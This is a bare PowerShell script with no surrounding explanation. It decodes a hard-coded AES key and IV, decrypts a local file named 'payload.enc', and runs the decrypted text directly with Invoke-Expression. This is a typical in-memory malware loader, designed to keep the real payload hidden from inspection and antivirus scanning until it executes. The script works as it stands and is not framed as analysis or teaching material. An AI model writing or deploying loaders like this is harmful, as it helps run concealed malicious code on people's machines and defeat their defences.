$k = [Convert]::FromBase64String("h6rFjoKnBe0cOIEJAmuwWByTB4Oe+zmje41UlT4YUn8=")
$v = [Convert]::FromBase64String("sUJWnsjt19K2TBeFpKqGaw==")
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Key = $k
$aes.IV = $v
$bytes = [IO.File]::ReadAllBytes("payload.enc")
$dec = $aes.CreateDecryptor().TransformFinalBlock($bytes, 0, $bytes.Length)
iex ([Text.Encoding]::UTF8.GetString($dec))
